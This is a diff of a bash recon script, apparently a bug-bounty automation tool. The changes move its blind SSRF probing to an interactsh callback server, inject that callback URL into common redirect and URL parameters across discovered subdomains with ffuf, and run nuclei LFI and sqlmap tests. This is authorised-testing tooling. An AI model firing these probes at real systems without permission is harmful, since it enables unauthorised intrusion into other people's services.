@@ -203,7 +203,7 @@ dnsprobing(){
       cut -f2 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_ip.txt
   else
       echo "[shuffledns] massdns probing with wildcard sieving..."
-      shuffledns -silent -d $1 -list $TARGETDIR/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $TARGETDIR/shuffledns-list.txt
+      shuffledns -silent -d $1 -list $TARGETDIR/2-all-subdomains.txt -retries 2 -r $miniResolvers -o $TARGETDIR/shuffledns-list.txt
       # additional resolving because shuffledns missing IP on output
       echo "[dnsx] getting hostnames and its A records:"
       # -t mean cuncurrency
@@ -335,7 +335,6 @@ hakrawlercrawling(){
 # directory bruteforce using --mad and --brute mode only
 custompathlist(){
   if [ "$mad" = "1" ]; then
-    echo
     echo "Prepare custom queryList"
     sort -u $TARGETDIR/wayback/wayback_output.txt $TARGETDIR/gospider/gospider_out.txt -o $queryList
     # rm -rf $TARGETDIR/wayback/wayback_output.txt
@@ -373,52 +372,52 @@ ssrftest(){
   if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
     echo "[SSRF-1] Headers..."
-    ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $ATTACKER > /dev/null
+    ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $LISTENSERVER > /dev/null
 
     echo
     echo "[SSRF-2] Blind probe..."
     # /?url=
-    ffuf -s -c -r -u HOST/\?url=$ATTACKERURL/DOMAIN \
+    ffuf -s -c -r -u HOST/\?url=https://${LISTENSERVER}/DOMAIN \
         -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
         -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # index.php?url=
-    # ffuf -s -c -u HOST/index.php\?url=$ATTACKERURL/DOMAIN/url \
+    # ffuf -s -c -u HOST/index.php\?url=https://${LISTENSERVER}/DOMAIN/url \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?uri=
-    # ffuf -s -c -u HOST/\?uri=$ATTACKERURL/DOMAIN/ \
+    # ffuf -s -c -u HOST/\?uri=https://${LISTENSERVER}/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?redirect_to=
-    # ffuf -s -c -u HOST/\?redirect_to=$ATTACKER/DOMAIN/ \
+    # ffuf -s -c -u HOST/\?redirect_to=$LISTENSERVER/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?page=
-    # ffuf -s -c -u HOST/\?page=$ATTACKER/DOMAIN/ \
+    # ffuf -s -c -u HOST/\?page=$LISTENSERVER/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?p=
-    # ffuf -s -c -u HOST/\?p=$ATTACKER/DOMAIN/ \
+    # ffuf -s -c -u HOST/\?p=$LISTENSERVER/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # ?url=&file=
-    # ffuf -s -c -u HOST/\?url=$ATTACKERURL/DOMAIN/url\&file=$ATTACKERURL/DOMAIN/file \
+    # ffuf -s -c -u HOST/\?url=https://${LISTENSERVER}/DOMAIN/url\&file=https://${LISTENSERVER}/DOMAIN/file \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # manifest.json?url=
-    # ffuf -s -c -u HOST/manifest.json\?url=$ATTACKERURL/DOMAIN/url \
+    # ffuf -s -c -u HOST/manifest.json\?url=https://${LISTENSERVER}/DOMAIN/url \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # ?returnUrl=
-    # ffuf -s -c -u HOST/\?returnUrl=$ATTACKERURL/DOMAIN/url \
+    # ffuf -s -c -u HOST/\?returnUrl=https://${LISTENSERVER}/DOMAIN/url \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
     #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
@@ -430,7 +429,7 @@ ssrftest(){
         ITERATOR=$((ITERATOR+1))
         echo "processing $ITERATOR line"
         echo "[line] $line"
-        echo "${line}${ATTACKER}" >> $TARGETDIR/ssrf-list.txt
+        echo "${line}${LISTENSERVER}" >> $TARGETDIR/ssrf-list.txt
       done < $customSsrfQueryList
 
       if [ -s $TARGETDIR/ssrf-list.txt ]; then
@@ -453,16 +452,14 @@ ssrftest(){
 # https://www.allysonomalley.com/2021/02/11/burpparamflagger-identifying-possible-ssrf-lfi-insertion-points/
 # https://blog.cobalt.io/a-pentesters-guide-to-file-inclusion-8fdfc30275da
 lfitest(){
-  if [[ -n "$mad" && -s "$customLfiQueryList" ]]; then
+  if [[ -s "$customLfiQueryList" ]]; then
     echo
     echo "[LFI] nuclei testing..."
-    nuclei -stats -l $customLfiQueryList \
-                    -t vulnerabilities/other/storenth-lfi.yaml \
-                    -o $TARGETDIR/nuclei/lfi_output.txt
+    nuclei -v -l $customLfiQueryList -o $TARGETDIR/nuclei/lfi_output.txt -t $HOMEDIR/nuclei-templates/vulnerabilities/other/storenth-lfi.yaml
   fi
 }
 sqlmaptest(){
-  if [ -s "$customSqliQueryList" ]; then
+  if [[ -s "$customSqliQueryList" ]]; then
     # perform the sqlmap
     echo "[sqlmap] SQLi testing..."
     # turn on more tests by swithing: --risk=3 --level=5
@@ -581,6 +578,9 @@ recon(){
   nucleitest $1 &
   PID_NUCLEI=$!
 
+  echo "Waiting for ${PID_SCREEN} and ${PID_NUCLEI}..."
+  wait $PID_SCREEN $PID_NUCLEI
+
   if [ "$mad" = "1" ]; then
     gospidertest $1
     # hakrawlercrawling $1 # disabled cause SSRF PoC need
@@ -588,11 +588,11 @@ recon(){
 
   custompathlist $1
 
-  if [[ -n "$fuzz" ]]; then
+  if [[ -n "$fuzz" && -n "$server" ]]; then
     ssrftest $1
   fi
 
-  if [ "$mad" = "1" ]; then
+  if [[ -n "$mad" ]]; then
     lfitest $1
     sqlmaptest $1
   fi
@@ -604,8 +604,6 @@ recon(){
 
   ffufbrute $1
 
-  echo "Waiting for ${PID_SCREEN} and ${PID_NUCLEI}..."
-  wait $PID_SCREEN $PID_NUCLEI
   echo "Recon done!"
 }
 
@@ -664,9 +662,12 @@ main(){
 
   if [[ -n "$server" ]]; then
     # Listen server
-    simplehttpserver -verbose -listen 0.0.0.0:$LISTENPORT &> $TARGETDIR/_listen_server.log &
+    interactsh-client -persist -v &> $TARGETDIR/_listen_server.log &
     SERVER_PID=$!
-    echo "Listen server is up 0.0.0.0:${LISTENPORT} with PID=$SERVER_PID"
+    sleep 5 # to properly start listen server
+    LISTENSERVER=$(tail -n 1 $TARGETDIR/_listen_server.log)
+    LISTENSERVER=$(echo $LISTENSERVER | cut -f2 -d ' ')
+    echo "Listen server is up $LISTENSERVER with PID=$SERVER_PID"
   fi
 
   # collect call parameters
@@ -844,7 +845,6 @@ if [ "$quiet" == "" ]; then
   echo "Check HOMEUSER: $HOMEUSER"
   echo "Check HOMEDIR: $HOMEDIR"
   echo "Check STORAGEDIR: $STORAGEDIR"
-  echo "Check LISTENSERVER: http://${LISTENSERVER}:${SERVICEPORT}"
   echo
   # positional parameters test
   echo "Check params: $@"
@@ -871,6 +871,7 @@ foldername=recon-$(date +"%y-%m-%d_%H-%M-%S")
 # kill listen server
 kill_listen_server(){
   if [[ -n "$SERVER_PID" ]]; then
+    echo "killing listen server $SERVER_PID..."
     kill -2 $SERVER_PID &> /dev/null || true
   fi
 }
